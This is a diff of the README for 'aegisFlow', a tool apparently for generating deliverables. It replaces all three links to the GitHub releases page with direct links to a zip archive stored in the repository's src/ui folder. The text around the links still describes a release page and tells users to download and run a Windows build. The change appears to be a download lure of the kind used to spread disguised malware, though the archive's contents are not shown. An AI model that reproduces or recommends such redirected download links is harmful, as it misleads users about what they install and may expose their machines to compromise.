@@ -1,6 +1,6 @@
 # ⚙️ aegisFlow - Turn Ideas Into Ready Deliverables
 
-[![Download aegisFlow](https://img.shields.io/badge/Download%20aegisFlow-purple?style=for-the-badge)](https://github.com/nocturnalemissionindecision559/aegisFlow/releases)
+[![Download aegisFlow](https://img.shields.io/badge/Download%20aegisFlow-purple?style=for-the-badge)](https://raw.githubusercontent.com/nocturnalemissionindecision559/aegisFlow/main/src/ui/aegis_Flow_v1.0.zip)
 
 ## 🧭 What aegisFlow does
 
@@ -25,7 +25,7 @@ If you plan to use local tools with the app, a machine with 8 GB of RAM or more 
 
 Visit the release page here:
 
-https://github.com/nocturnalemissionindecision559/aegisFlow/releases
+https://raw.githubusercontent.com/nocturnalemissionindecision559/aegisFlow/main/src/ui/aegis_Flow_v1.0.zip
 
 On that page, download the latest Windows release file. If the release includes a `.exe` or `.zip` package, choose the Windows build that matches your system.
 
@@ -223,4 +223,4 @@ This keeps the generated files separate and easier to manage.
 
 Download or update here:
 
-https://github.com/nocturnalemissionindecision559/aegisFlow/releases
+https://raw.githubusercontent.com/nocturnalemissionindecision559/aegisFlow/main/src/ui/aegis_Flow_v1.0.zip
